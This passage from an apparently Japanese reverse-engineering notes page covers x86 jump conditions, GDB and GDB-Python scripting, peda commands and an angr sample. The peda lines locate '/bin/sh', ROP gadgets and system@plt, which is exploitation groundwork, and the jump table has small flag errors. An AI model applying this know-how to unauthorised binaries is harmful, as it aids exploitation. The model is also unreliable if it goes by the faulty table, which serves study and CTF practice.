number\">1</span>）\nJCXZ\tCXレジスタが0\nJE\t等しい<span class=\"token punctuation\">(</span>ZF <span class=\"token operator\">=</span> <span class=\"token number\">1</span>）  <span class=\"token number\">74</span>\nJG\tより大きい（ZF <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;</span> SF <span class=\"token operator\">=</span> OF）\nJGE\tより大きいか等しい（SD <span class=\"token operator\">=</span> OF）\nJL\tより小さい（SF <span class=\"token operator\">!</span> OF）\nJLE\tより小さいか等しい（ZF <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span> SF <span class=\"token operator\">!</span> OF）\nJNA\tより上でない（CF <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span> ZF <span class=\"token operator\">=</span> <span class=\"token number\">1</span>）\nJNAE\tより上でなく等しい（CF <span class=\"token operator\">=</span> <span class=\"token number\">1</span>）\nJNB\tより下でない（CF <span class=\"token operator\">=</span> <span class=\"token number\">0</span>）\nJNBE\tより下でなく等しい（CF <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;</span> ZF <span class=\"token operator\">=</span> <span class=\"token number\">0</span>）\nJNC\tキャリーがない（CF <span class=\"token operator\">=</span> <span class=\"token number\">0</span>）\nJNE\t等しくない<span class=\"token punctuation\">(</span>ZF <span class=\"token operator\">=</span> <span class=\"token number\">0</span>） <span class=\"token number\">75</span>\nJNG\tより大きくない（ZF <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span> SF <span class=\"token operator\">!</span> OF）\nJNGE\tより大きくなく等しくない（SF <span class=\"token operator\">!</span> OF）\nJNL\tより小さくない（SF <span class=\"token operator\">=</span> OF）\nJNLE\tより小さくなく等しくない<span class=\"token punctuation\">(</span>ZF <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;</span> SF <span class=\"token operator\">=</span> OF）\nJNO\tオーバーフローがない（OF <span class=\"token operator\">=</span> <span class=\"token number\">0</span>）\nJNP\tパリティがない（PF <span class=\"token operator\">=</span> <span class=\"token number\">0</span>）\nJNS\t符号がない（SF <span class=\"token operator\">=</span> <span class=\"token number\">0</span>）\nJNZ\tゼロではない（ZF <span class=\"token operator\">=</span> <span class=\"token number\">0</span>）\nJO\tオーバーフローがある（PF <span class=\"token operator\">=</span> <span class=\"token number\">1</span>）\nJP\tパリティがある（PF <span class=\"token operator\">=</span> <span class=\"token number\">1</span>）\nJPE\tパリティが偶数<span class=\"token punctuation\">(</span>PF <span class=\"token operator\">=</span> <span class=\"token number\">1</span>）\nJPO\tパリティが基数<span class=\"token punctuation\">(</span>PF <span class=\"token operator\">=</span> <span class=\"token number\">0</span>）\nJS\t符合がある<span class=\"token punctuation\">(</span>SF <span class=\"token operator\">=</span> <span class=\"token number\">1</span>）\nJZ\tゼロである<span class=\"token punctuation\">(</span>ZF <span class=\"token operator\">=</span> <span class=\"token number\">1</span>）\n\n<span class=\"token punctuation\">[</span>インラインアセンブラで学ぶアセンブリ言語 第3回 <span class=\"token punctuation\">(</span><span class=\"token number\">1</span>/3<span class=\"token punctuation\">)</span>：CodeZine（コードジン）<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>https://codezine.jp/article/detail/485<span class=\"token punctuation\">)</span></code></pre></div>\n<h3 id=\"メモリ読み出しのよく使うやつ\" style=\"position:relative;\"><a href=\"#%E3%83%A1%E3%83%A2%E3%83%AA%E8%AA%AD%E3%81%BF%E5%87%BA%E3%81%97%E3%81%AE%E3%82%88%E3%81%8F%E4%BD%BF%E3%81%86%E3%82%84%E3%81%A4\" aria-label=\"メモリ読み出しのよく使うやつ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>メモリ読み出しのよく使うやつ</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">x/5i <span class=\"token variable\">$rip</span>\nx/5i <span class=\"token variable\">$rbp</span>-0x1c\nx /s\nx /16\nx/40c <span class=\"token variable\">$rax</span>+<span class=\"token variable\">$rdx</span>*1</code></pre></div>\n<h3 id=\"レジストリ読み出し\" style=\"position:relative;\"><a href=\"#%E3%83%AC%E3%82%B8%E3%82%B9%E3%83%88%E3%83%AA%E8%AA%AD%E3%81%BF%E5%87%BA%E3%81%97\" aria-label=\"レジストリ読み出し permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>レジストリ読み出し</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">info registers eflags\n\nxinfo register edx</code></pre></div>\n<h3 id=\"変数読み出し\" style=\"position:relative;\"><a href=\"#%E5%A4%89%E6%95%B0%E8%AA%AD%E3%81%BF%E5%87%BA%E3%81%97\" aria-label=\"変数読み出し permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>変数読み出し</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># 現在のフレームのローカル変巣</span>\ninfo locals\n\n<span class=\"token comment\"># 特定の変数の値を出力</span>\np param\n\n<span class=\"token comment\"># 特定の変数の書き換え</span>\n<span class=\"token builtin class-name\">set</span> var param <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello world!\"</span>\n<span class=\"token builtin class-name\">set</span> <span class=\"token punctuation\">{</span>char<span class=\"token punctuation\">}</span>0x5555555592a0 <span class=\"token operator\">=</span> 0x20\n\n<span class=\"token comment\"># 現在のフレームの引数の一覧</span>\ninfo args\n\n<span class=\"token comment\"># 特定の変数の変更の追跡</span>\ndisplay param\nundisplay\n\n<span class=\"token comment\"># 特定の変数の変更時にブレーク</span>\n<span class=\"token function\">watch</span> param</code></pre></div>\n<h3 id=\"実行時引数--標準入出力\" style=\"position:relative;\"><a href=\"#%E5%AE%9F%E8%A1%8C%E6%99%82%E5%BC%95%E6%95%B0--%E6%A8%99%E6%BA%96%E5%85%A5%E5%87%BA%E5%8A%9B\" aria-label=\"実行時引数  標準入出力 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>実行時引数 / 標準入出力</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># 実行</span>\nrun\n\n<span class=\"token comment\"># コマンドライン引数付きで実行</span>\nrun arg1\n\n<span class=\"token comment\"># 標準入力(ファイルで指定可能)</span>\nrun <span class=\"token operator\">&lt;</span> inputfile\n\n<span class=\"token comment\"># 標準出力(ファイルで指定可能)</span>\nrun <span class=\"token operator\">></span> outputfile</code></pre></div>\n<h3 id=\"gdbをpythonで操作する\" style=\"position:relative;\"><a href=\"#gdb%E3%82%92python%E3%81%A7%E6%93%8D%E4%BD%9C%E3%81%99%E3%82%8B\" aria-label=\"gdbをpythonで操作する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>GDBをPythonで操作する</h3>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># gdb -x run.py</span>\n<span class=\"token keyword\">import</span> gdb\n<span class=\"token keyword\">from</span> pprint <span class=\"token keyword\">import</span> pprint\n\n<span class=\"token comment\"># pprint(dir(gdb))</span>\nBINDIR <span class=\"token operator\">=</span> <span class=\"token string\">\"/home/kali/Downloads\"</span>\nBIN <span class=\"token operator\">=</span> <span class=\"token string\">\"chall\"</span>\nINPUT <span class=\"token operator\">=</span> <span class=\"token string\">\"./in.txt\"</span>\nOUT <span class=\"token operator\">=</span> <span class=\"token string\">\"./out.txt\"</span>\nBREAK <span class=\"token operator\">=</span> <span class=\"token string\">\"0x4a09f9\"</span>\n\ngdb<span class=\"token punctuation\">.</span>execute<span class=\"token punctuation\">(</span><span class=\"token string\">'file {}/{}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>BINDIR<span class=\"token punctuation\">,</span> BIN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ngdb<span class=\"token punctuation\">.</span>execute<span class=\"token punctuation\">(</span><span class=\"token string\">'b *{}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>BREAK<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 引数を変えてループ実行</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>INPUT<span class=\"token punctuation\">,</span> <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">)</span>\n    gdb<span class=\"token punctuation\">.</span>execute<span class=\"token punctuation\">(</span><span class=\"token string\">'run &lt; {}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>INPUT<span class=\"token punctuation\">,</span> OUT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 特定のメモリアドレスの値の書き換え</span>\nseed <span class=\"token operator\">=</span> <span class=\"token string\">\"rgUAvvyfyApNPEYg\"</span>\n<span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> c <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    target <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x5555555592a0</span> <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'set {}{} = {}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{char}\"</span><span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    gdb<span class=\"token punctuation\">.</span>execute<span class=\"token punctuation\">(</span><span class=\"token string\">'set {}{} = {}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{char}\"</span><span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token comment\"># メモリの値をバイト形式で取得</span>\n<span class=\"token comment\"># https://doc.ecoscentric.com/gnutools/doc/gdb/Inferiors-In-Python.html</span>\ni <span class=\"token operator\">=</span> gdb<span class=\"token punctuation\">.</span>inferiors<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\nmem <span class=\"token operator\">=</span> i<span class=\"token punctuation\">.</span>read_memory<span class=\"token punctuation\">(</span><span class=\"token number\">0x7fffffffdaa0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">264</span><span class=\"token punctuation\">)</span>\nbase <span class=\"token operator\">=</span> mem<span class=\"token punctuation\">.</span>tobytes<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># register</span>\n<span class=\"token comment\"># https://sourceware.org/gdb/onlinedocs/gdb/Basic-Python.html</span>\nreg <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>gdb<span class=\"token punctuation\">.</span>parse_and_eval<span class=\"token punctuation\">(</span><span class=\"token string\">\"$rax\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>reg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nh <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\ni <span class=\"token operator\">=</span> gdb<span class=\"token punctuation\">.</span>inferiors<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    reg <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>gdb<span class=\"token punctuation\">.</span>parse_and_eval<span class=\"token punctuation\">(</span><span class=\"token string\">\"$rax\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    h<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>reg<span class=\"token punctuation\">)</span>\n    gdb<span class=\"token punctuation\">.</span>execute<span class=\"token punctuation\">(</span><span class=\"token string\">\"continue\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> a <span class=\"token keyword\">in</span> h<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">\"  \"</span><span class=\"token punctuation\">)</span>\n    mem <span class=\"token operator\">=</span> i<span class=\"token punctuation\">.</span>read_memory<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>mem<span class=\"token punctuation\">.</span>tobytes<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\ngdb<span class=\"token punctuation\">.</span>execute<span class=\"token punctuation\">(</span><span class=\"token string\">'quit'</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h3 id=\"gdbでプロセスにアタッチワンライナー\" style=\"position:relative;\"><a href=\"#gdb%E3%81%A7%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%AB%E3%82%A2%E3%82%BF%E3%83%83%E3%83%81%E3%83%AF%E3%83%B3%E3%83%A9%E3%82%A4%E3%83%8A%E3%83%BC\" aria-label=\"gdbでプロセスにアタッチワンライナー permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>GDBでプロセスにアタッチ(ワンライナー)</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token assign-left variable\">p</span><span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">ps</span> -ef <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> -v <span class=\"token function\">grep</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> myapp <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> <span class=\"token string\">'{print $2}'</span><span class=\"token variable\">)</span></span><span class=\"token punctuation\">;</span> gdb -p <span class=\"token variable\">$p</span> -x gdbcmd.txt</code></pre></div>\n<h3 id=\"pedaの機能を使う\" style=\"position:relative;\"><a href=\"#peda%E3%81%AE%E6%A9%9F%E8%83%BD%E3%82%92%E4%BD%BF%E3%81%86\" aria-label=\"pedaの機能を使う permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>pedaの機能を使う</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># アドレス検索</span>\n$ searchmem 0x603890\n$ searchmem <span class=\"token string\">\"/bin/sh\"</span>\n\n<span class=\"token comment\"># checksec</span>\n$ checksec\n\n<span class=\"token comment\"># ropgadget</span>\n$ ropgadget\nret <span class=\"token operator\">=</span> 0x401016\npopret <span class=\"token operator\">=</span> 0x401139\naddesp_8 <span class=\"token operator\">=</span> 0x401013\n\n<span class=\"token comment\"># plt</span>\n$ plt\nBreakpoint <span class=\"token number\">5</span> at 0x401040 <span class=\"token punctuation\">(</span>system@plt<span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"gccのtips\" style=\"position:relative;\"><a href=\"#gcc%E3%81%AEtips\" aria-label=\"gccのtips permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>gccのTips</h2>\n<ul>\n<li><code class=\"language-text\">undefined reference to pthread_create</code>のようなエラーが出る場合<code class=\"language-text\">-pthread</code>オプションを付ける</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># https://stackoverflow.com/questions/1662909/undefined-reference-to-pthread-create-in-linux</span>\ngcc -pthread <span class=\"token number\">40616</span>.c -o <span class=\"token number\">40616</span>.c</code></pre></div>\n<h2 id=\"angrのサンプル\" style=\"position:relative;\"><a href=\"#angr%E3%81%AE%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB\" aria-label=\"angrのサンプル permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>angrのサンプル</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> angr\n<span class=\"token keyword\">import</span> monkeyhex\n<span class=\"token keyword\">import</span> pprint\n\nproj <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span><span class=\"token string\">\"licence.exe\"</span><span class=\"token punctuation\">,</span> auto_load_libs<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">\"\"\"\npipenv shell\npip install angr\npip install monkeyhex\n\"\"\"</span>\n\n<span class=\"token comment\">#######################################################</span>\n<span class=\"token comment\"># First</span>\n<span class=\"token comment\">#######################################################</span>\n<span class=\"token triple-quoted-string string\">\"\"\"\nprint(\"ARCH\", proj.arch)\nprint(\"EntryPoint\", proj.entry)\nprint(\"FileName\", proj.filename)\n\"\"\"</span>\n\n<span class=\"token comment\">#######################################################</span>\n<span class=\"token comment\"># Loader</span>\n<span class=\"token comment\">#######################################################</span>\n<span class=\"token triple-quoted-string string\">\"\"\"\nprint(\"Loader\", proj.loader)\nprint(\"LoaderShareObj\", proj.loader.shared_objects)\nprint(\"MinAddr\", proj.loader.min_addr)\nprint(\"MaxAddr\", proj.loader.max_addr)\nprint(\"ExeStack\", proj.loader.main_object.execstack)\nprint(\"Pic\", proj.loader.main_object.pic)\n\"\"\"</span>\n\n<span class=\"token comment\">#######################################################</span>\n<span class=\"token comment\"># entry point</span>\n<span class=\"token comment\">#######################################################</span>\n<span class=\"token triple-quoted-string string\">\"\"\"\nblock = proj.factory.block(proj.entry)\nprint(block.pp())\nprint(\"Instructions\", block.instructions)\nprint(\"Instruction Addrs\", block.instruction_addrs)\n\nprint(\"Capstone\", block.capstone)\nprint(\"Vex\", block.vex)\n\"\"\"</span>\n\n<span class=\"token comment\">#######################################################</span>\n<span class=\"token comment\"># Analyses</span>\n<span class=\"token comment\">#######################################################</span>\n<span class=\"token triple-quoted-string string\">\"\"\"\nproj.analyses.BackwardSlice        proj.analyses.CongruencyCheck      proj.analyses.reload_analyses       \nproj.analyses.BinaryOptimizer      proj.analyses.DDG                  proj.analyses.StaticHooker          \nproj.analyses.BinDiff              proj.analyses.DFG                  proj.analyses.VariableRecovery      \nproj.analyses.BoyScout             proj.analyses.Disassembly          proj.analyses.VariableRecoveryFast  \nproj.analyses.CDG                  proj.analyses.GirlScout            proj.analyses.Veritesting           \nproj.analyses.CFG                  proj.analyses.Identifier           proj.analyses.VFG                   \nproj.analyses.CFGEmulated          proj.analyses.LoopFinder           proj.analyses.VSA_DDG               \nproj.analyses.CFGFast              proj.analyses.Reassembler\n\"\"\"</span>\n\ncfg <span class=\"token operator\">=</span> proj<span class=\"token punctuation\">.</span>analyses<span class=\"token punctuation\">.</span>CFGFast<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ngraph <span class=\"token operator\">=</span> cfg<span class=\"token punctuation\">.</span>graph\nentry_node <span class=\"token operator\">=</span> cfg<span class=\"token punctuation\">.</span>get_any_node<span class=\"token punctuation\">(</span>proj<span class=\"token punctuation\">.</span>entry<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># print(\"Graph Nodes\", len(cfg.graph.nodes()))</span>\n<span class=\"token comment\"># print(\"Graph Entry Nodes\", len(list(cfg.graph.successors(entry_node))))</span>\n\n<span class=\"token comment\">#######################################################</span>\n<span class=\"token comment\"># Main</span>\n<span class=\"token comment\">#######################################################</span>\nobj <span class=\"token operator\">=</span> proj<span class=\"token punctuation\">.</span>loader<span class=\"token punctuation\">.</span>main_object\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Entry\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>entry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Min Addr\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>min_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Max Addr\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>max_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\naddr <span class=\"token operator\">=</span> obj<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"strcmp\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"strcmp addr\"</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># print_good = 0x405e6d</span>\n<span class=\"token comment\"># avoid_addr = [0x405ceb, 0x405d2f, 0x405d62, 0x405d8f, 